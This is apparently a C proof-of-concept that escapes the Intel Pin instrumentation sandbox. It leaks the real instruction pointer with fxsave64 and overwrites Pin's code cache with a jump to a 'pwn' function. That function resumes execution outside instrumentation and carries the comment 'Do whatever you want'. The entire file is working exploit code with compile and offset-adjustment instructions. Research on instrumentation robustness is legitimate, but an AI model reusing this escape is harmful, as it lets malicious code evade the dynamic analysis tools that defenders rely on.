#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <asm/prctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>

/*
 * Please compile the program as follows or the involved constants have to be manually adjusted:
 *
 * gcc -o escape -O3 escape.c
 *
 * If you happen to compile this program with the -fstack-protector-all flag set, please
 * add 0x10 to the fixup address in line 95 to jump over the cookie set procedure
 *
 */

unsigned long get_real_rip() {
    unsigned long fxsave_memoty[0x34];
    memset(fxsave_memoty, 0, sizeof(fxsave_memoty));

    asm volatile (
        "fldpi\n\t"
        "fxsave64 %0"
        : "=m" (fxsave_memoty)
    );

    return fxsave_memoty[1];
}

void fixup() {
    /*
     * Set the correct fsbase value because the current value belongs
     * to Pin. This is important for later cookie checks.
     */
    unsigned long fs;
    asm volatile (
        "mov 0x3d8(%%r15), %0"
        : "=r" (fs)
    );

    if (syscall(SYS_arch_prctl, ARCH_SET_FS, fs) != 0) {
        /*
         * If the system call fails we exit gracefully
         * using inlined assembly since the libc wrapper
         * functions will fail because of corrupted fs value
         */
        const char *fsFail = "FS register could not be set!\n";

        // Write syscall
        asm volatile (
            "mov $0x1e, %%edx\n\t"
            "mov %0, %%rsi\n\t"
            "mov $0x1, %%rdi\n\t"
            "mov $0x1, %%rax\n\t"
            "syscall"
            :: "r" (fsFail)
            : "edx", "rsi", "rdi", "rax"
        );

        // Exit gracefully
        asm volatile (
            "mov $0xe7, %%rax\n\t"
            "syscall"
            ::
            : "rax"
        );
    }

    asm volatile (
        "jmp pwn"
    );
}

void pwn() {
    /** Do whatever you want outside of the sandbox here **/

    // For example continue program's execution *outside of the sandbox*
    asm volatile (
        "mov 0x40(%%r15), %%rsp\n\t" // rsp might need to be adjusted according to the utilised Pintool
        "ret"
        ::
    );
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        puts("Execute this program with any parameter to trigger the sandbox escape!");
    }

    // Get address of the function to be called outside of sandbox
    unsigned char *fixupAddress = (unsigned char *) fixup; // + 0x10;

    // Execute to jit code, save it in the code cache, and get its address
    unsigned long rip = get_real_rip();

    if (argc > 1) {
        // Overwrite code cache
        memcpy((void *) rip, "\x48\xb8", 2); // mov rax, fixupAddress
        memcpy((void *) rip+2, &fixupAddress, 8);
        memcpy((void *) rip+10, "\xff\xe0", 2); // jmp rax;

        // Call the same function again to execute the overwritten code cache
        rip = get_real_rip();
    }

    puts("--Application--\tExecuting syscall number 39 (sys_getpid)");

    // Execute syscall with some visible side effect
    pid_t pid = 0;
    asm volatile (
        "mov $0x27, %%rax\n\t"
        "syscall\n\t"
        "mov %%eax, %0"
        : "=m"(pid)
        :: "rax"
    );

    printf("--Application--\tThe proccess PID is: %u\n", pid);

    puts("--Application--\tExiting..");

    return 0;
}
